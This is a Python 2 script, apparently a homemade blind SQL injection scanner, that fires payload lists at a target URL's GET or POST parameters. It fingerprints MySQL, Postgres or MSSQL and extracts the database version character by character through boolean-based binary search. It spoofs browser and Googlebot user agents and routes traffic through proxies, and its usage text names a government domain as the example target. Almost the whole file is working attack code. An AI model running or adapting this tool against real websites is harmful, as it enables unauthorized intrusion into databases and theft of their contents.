#!/usr/bin/env python
#coding:utf-8
import requests
from sys import argv, exit
from random import choice
from HTMLParser import HTMLParser
from getopt import getopt, GetoptError
from time import sleep
from random import random
import socks
class Injection:
	Agentes={
	'Chrome':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
	'Google':'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
	'iExplorer':'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko',
	'Firefox':'Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0',
	'Safari':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A',
	'iPhone':'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16',
	'Android':'Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
	}
	cabeceras={}
	proxy={} #if request need a proxy for connection it will be inside this variable
	cookies = {} #if request need coookies it will be inside this variable
	datos={}
	method = -1 # True = Get method # False = Post method
	server = "" #URL string
	NoAleatorio = int(random()*100)

	Flags={ ## This variable store succesfull injection queries
		'Generic':{
			'Prefijo':[],
			'Payload':[],
			'Sufijo':[]
				},
		'MySQL':{
			'Prefijo':[],
			'Payload':[],
			'Sufijo':[]
				},
		'Postgres':{
			'Prefijo':[],
			'Payload':[],
			'Sufijo':[]
				},
		'Mssql':{
			'Prefijo':[],
			'Payload':[],
			'Sufijo':[]
		},
		'Oracle':{
			'Prefijo':[],
			'Payload':[],
			'Sufijo':[]
			}
		}

	Prefijos = [" ",
				"'","''", #Simple Quotes
				"')","'))","')))", #Simple Quotes with Parentheses
				'"','""',
				'")','"))','")))',
				"%'",'%"' #Comodines
				]

	Comodin="_sqli_"

	Sufijos={
		#'MySQL':[' ','#','-- -a'," and '%'='"],
		'Generic':['--','-- -y'],
		'MySQL':['#','-- -a'],
		'Postgres':[';/*',';--'],
		'Mssql':['-- -e'],
		'Oracle':['from dual;']
	}

	GoodRequest=0

	PayloadsAttempt={ # Theses payloads are used in the SQLi blind detection
		'Generic':[#'and True',
					  'and {0}-1={0}-1'.format(int(random()*1000)),
				      'and ascii(substring({0},1,1))={1}'.format(chr(NoAleatorio),ord(chr(NoAleatorio))),
				      'and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
				  ],
		'MySQL':[ #'and {0}-2={0}-2'.format(int(random()*1000)), # Easy conditionals
					  'and ascii(substring({0},1,1))={1}'.format(chr(NoAleatorio),ord(chr(int(random()*100)))),#'and ascii(substring({0},1,1))={1}'.format(chr(int(random()*100)),ord(chr(int(random()*100)))), # Complex substring nested ascii
					  'and cast("{0}" as signed)=cast("{0}" as signed)'.format(NoAleatorio), # Easy integers conditionals

					  #"and (select concat(':','D'))"
		# MySQL payloads with 'and' changed to ampersen &&
					  '&& ( select if ( cast((select floor(rand()*100)) as signed)>0,2,null) )',#'&& {0}={0}'.format(int(random()*1000)), # Easy conditionals
					  #'&& cast("{0}" as signed)=cast("{0}" as signed)'.format(NoAleatorio), # Easy integers conditionals
					  #'&& ascii(substring({0},1,1))={1}'.format(chr(NoAleatorio),ord(chr(int(random()*100)))),'&& ascii(substring({0},1,1))={1}'.format(chr(int(random()*100)),ord(chr(int(random()*100)))), # Complex substring nested ascii
					  #Specific queries
					  '&& (select @@version)',
					  'and (select database())'#,'&& and (select user())',
					  #'and (SELECT if(1=1,sleep(0.2),null))', 'and (SELECT if("m"="m",sleep(4),null))', 
					  #' and (ascii(substring((select table_name FROM information_schema.tables limit 1),1,1)))>1'
					  ],
		'Postgres':[#'and True','and {0}-1={0}-1'.format(int(random()*1000)), # Easy conditionals
					  'and cast({0} as int)=cast({0} as int)'.format(int(random()*1000)),'and cast({0} as integer)=cast({0} as integer)'.format(int(random()*1000)),
					  #'and ascii(substring({0},1,1))={1}'.format(chr(NoAleatorio),ord(chr(NoAleatorio))),'and ascii(substring({0},1,1))={1}'.format(chr(int(random()*100)),ord(chr(int(random()*100)))), # Complex substring nested ascii	
					  'and (select current_database())',
					  'and (select user)',
					  'and trunc(random() * cast(random()*1291 as int) - 1)>0',
					  'and ascii(substring(@@version,1,1))=ascii("P")'
					],
		'Mssql':['and select @@version like 2008'],

		'Oracle':['and select @@version from dual']
				}

	catalogoMySQL=["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	catalogo={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMySQL={
		'version':["' and   ascii(substring(@@version,1,1))","'","and   ascii(substring(@@version,","))","-- -+"],
		'tablas':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'datos ':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoPostgres={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoMSSQL={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	catalogoOracle={
		'mysql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'postgres':["'and True -- -+", "'and False -- -+","order by 1 -- -+"],
		'mssql':["'and True -- -+", "'and False -- -+","order by 1 -- -+"]
	}
	notautos=['and 1=0-- -+']
	SentHeaders = ""
	respuesta = ""
	dataTempo = {}
	def __init__(self):
		self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setAgent(self,agent=""):
		if agent:
			self.cabeceras.update({'User-Agent':agent})
		else:
			self.cabeceras.update({'User-Agent':self.Agentes.get(choice(self.Agentes.keys()))})

	def setServer(self,server):
		self.server = server

	def setCookie(self,galleta):
		#self.cookie.update({""})
		print galleta

	def setData(self,datosPagina):
		datosPagina = datosPagina.split('&')
		for parameter in datosPagina:
			self.datos.update({parameter.split('=')[0]:parameter.split('=')[1]})

	def setMethod(self,metodo):
		if metodo == 'get':
			self.method = True
		elif metodo == 'post':
			self.method = False
		else:
			print "Method not implemented"
	def setProxy(self,proxy):
		if proxy.split("://")[0] in ["http","ftp","https"]:
			self.proxy = {proxy.split("://")[0]:proxy.split("://")[1]}
		else:
			self.proxy = self.proxy = {"http":proxy}
	@staticmethod
	def busqueda(obj,manejador,tipo,ok,up,down,fila,columna):
		caracter = chr(Injection.getMid(up,down))
		print "up: ",up," car: ",ord(caracter)," down:",down
		coord = str(fila)+","+str(columna)
		print "Coordenada: "+coord
		consulta = requests.get(url=obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+"="+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)
		if consulta.text == ok:
			return caracter
		elif (consulta.text != ok) and (up == down ):
			return "No encontrado"
		else:
			print " Consulta 2:"+obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+"

			consulta2 = requests.get(url=obj.server+manejador[tipo][1]+manejador[tipo][2]+coord+manejador[tipo][3]+">"+str(ord(caracter))+"-- -+",cookies=obj.cookies,headers=obj.cabeceras,proxies=obj.proxy)

				
			if consulta2.text == ok:
				print "iguales"
				print "up: ",up," down(car): ",ord(caracter)
				print ""
				return Injection.busqueda(obj,manejador,tipo,ok,up,ord(caracter),fila,columna)
			else:
				print "up(car): ",ord(caracter)," down:",down
				print ""
				down2=down
				if (down2 + 1) == ord(caracter):
					return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter)-1,down,fila,columna)
				return Injection.busqueda(obj,manejador,tipo,ok,ord(caracter),down,fila,columna)
			
		
			
	@staticmethod
	def getMid(up,down):
		return int(((up-down)/2) + down)



	def PostInjection(self):
		#First try MySQL queries
		Ftime = True
		self.dataTempo = self.datos.copy()
		for dbms in ('Generic','MySQL','Postgres','Mssql','Oracle'):
			print "="*25,"",dbms," Begin ","="*25
			for pref in self.Prefijos:
				for payl in self.PayloadsAttempt.get(dbms):
					for suf in self.Sufijos.get(dbms):
						#print self.datos
						self.dataTempo = self.datos.copy()
						#query is a dictionary which contains the payloads append to original data
						query = self.ChangePhrase(DataPost=self.dataTempo,FirsTime=Ftime,pload="{0}{1}{2}".format(pref,payl,suf))
						#sleep(0.09)
						#Attempt make a request to server with the sqli payload
						Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=query,proxies=self.proxy)
						Ftime=False
						#print "".join(("{0}={1}&").format(key, value) for key, value in query.items())[:-1]
						# Imprimir Respuesta
						if Attempt.content == self.GoodRequest.text:
							#print "============== First: {0} ||| Second: {1}".format(len(Attempt.content),len(self.GoodRequest.content))
							#print Attempt.text
							#Printing succesfull queries
							print "Succesfull Query =>","".join(("{0}={1}&").format(key, value) for key, value in query.items())[:-1]
							#print "Succesfull Query => ",Attempt.request.body
							#After do a post request, prefix, paylaod and suffix will be storage in "Flags" variable
							self.Flags[dbms]['Prefijo'].append(pref)
							self.Flags[dbms]['Payload'].append(payl)
							self.Flags[dbms]['Sufijo'].append(suf)
						else:
							print "|||||||||| Unsuccesfull Query |||||||||||","".join(("{0}={1}&").format(key, value) for key, value in query.items())[:-1]
			print "="*25,dbms," End ","="*25

	# Cleaning duplicate values from Flags
	def rmDupValue(self):
		for dbms in ('Generic','MySQL','Postgres','Mssql','Oracle'):
			print "*"*15," ",dbms," ","*"*15
			for field in ('Prefijo','Payload','Sufijo'):
				self.Flags[dbms][field] = set(self.Flags[dbms][field])
				print dbms,"",field,"",self.Flags[dbms][field]
			print "*"*40
								#Injection.PostInjection(Attempt)
		#print Injection.datos
		# print PostRequest.text
		# Attempt = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=self.datos,proxies=self.proxy)
		# #Printing headers
		# SentHeaders = PostRequest.request.headers
		# solicitud = PostRequest.request.headers
		# respuesta = PostRequest.content.lower()
		# print "{0} {1} {2}".format(PostRequest.request.method,PostRequest.request.path_url,"HTTP/1.1")
		# for cabecera in solicitud:
		# 	print "{0}:{1}".format(cabecera,solicitud.get(cabecera))


	#Function used to replace value of variable Comodin (passphrase) with queries to detect a sqli
	def ChangePhrase(self,DataPost="",pload="",FirsTime=False):
		if FirsTime:
			print "Primera vez ;)"
			lol = self.datos.copy()
			for param in lol.keys():
				if self.Comodin in lol.get(param):
					lol[param] = lol.get(param).replace(self.Comodin,"")
			self.GoodRequest = requests.post(url=self.server,cookies=self.cookies,headers=self.cabeceras,data=lol,proxies=self.proxy)
			#print self.GoodRequest.text
			print "Original Request",lol
			#sleep(0.2)
		for parametro in DataPost.keys():
			if self.Comodin in DataPost.get(parametro):
				DataPost[parametro] = DataPost.get(parametro).replace(self.Comodin,pload)
		return DataPost


	def Begin(self):
		#print self.server, self.cabeceras
		print "Starting Attack\n\n\n"+"="*20
		#sleep(1)
		if self.method:#GET
			pagina = requests.get(url=self.server,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
			print "pagina "+pagina.text
			for tauto in self.notautos:
				print "Query ",tauto
				tautosidad = requests.get(url=self.server+"' and 1=0 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
				tautosidad2 = requests.get(url=self.server+"' and 1=1 -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
				print tautosidad.text
				print tautosidad2.text
				if (tautosidad.text != pagina.text and tautosidad2.text == pagina.text):
					PGSQLoMySQL = requests.get(url=self.server+"' union select @@version -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
#					print "!",PGSQLoMySQL.text," !! ",pagina.text
					if PGSQLoMySQL.text == pagina.text:
						MSSQLoMySQL = requests.get(url=self.server+"' and True -- -+", cookies=self.cookies, headers=self.cabeceras, proxies=self.proxy)
						if MSSQLoMySQL.text == pagina.text:
							database = "mysql"
							print "Base de datos detectada: ",database
							char = ""
							version = ""
							indiceY = 1
							while char != "No encontrado":
								char =self.busqueda(self,self.catalogoMySQL,"version",pagina.text,126,32,indiceY,1)
								print "Caracter: "+char
								if char != "No encontrado":
									version += char
									indiceY = indiceY +1
							print "Version: "+version
							
						else:
							database = "mssql"
							print "Base de datos detectada: ",database
					else:
#						select tablename from pg_tables;
						database = "postgres"
						print "Base de datos detectada: ",database
					for query in self.catalogo.get(database):		
						ciego = requests.get(url=self.server+query,cookies=self.cookies,headers=self.cabeceras,proxies=self.proxy)
				
						if ciego == pagina:
							print query + " ! " + ciego.text + " ! iguales"
						else:
							print query + " ! " + ciego.text + " ! no iguales"
				else:
					print "Página no vulnerable"
		else:#POST
			self.PostInjection()
			# Remove Duplicate values
			self.rmDupValue()

def Opciones(argv):
	try:
		opciones, argumentos = getopt(argv[1:],"h:v",["request=","cookie=","user-agent=","method=","random-agent=","data=","proxy="])
	except GetoptError:
		print """### Ayuda ###\n{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>""".format(argv[0])
		exit(2)
	for opt, vals in opciones:
		#Ayuda
		if opt in ('-h','--help'):
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
		#Server
		elif opt in ('--request'):
			#print "{0} -> {1}".format(opt,vals)
			inject.setServer(vals)
		#User-Agent
		elif opt in ('--user-agent'):
			inject.setAgent(vals)
			#print "{0} -> {1}".format(opt,vals)
		elif opt in ('--cookie'):
			inject.setCookie(vals)
		elif opt in ('--data'):
			inject.setData(vals)
		#User-Agent Random NO FUNCIONA AUN
		elif opt == '--random-agent':
			inject.setAgent("")
		elif opt == '--proxy':
			inject.setProxy(vals)
		#Option not valid
		elif opt == '--method':
			if vals in ('get','post'):
				inject.setMethod(vals)
			else:
				print "Method not implemented"
		else:
			print '{0} --request=<http://www.example.gob.mx> --user-agent=<example/2.1>'.format(argv[0])
			exit(1)
	else:
		main()



def main():
	inject.Begin()

	# Response = str(requests.get(server,headers=cabeceras).text).lower()
	# posIni = Response.find('post')
	# posFin = Response.find('</form>',posIni)
	# parametros = Response[posIni:posFin]
	# datos = parametros[parametros.find('<table'):] 
	# print datos
if __name__ == "__main__":
	inject = Injection()
	Opciones(argv)
	#main()
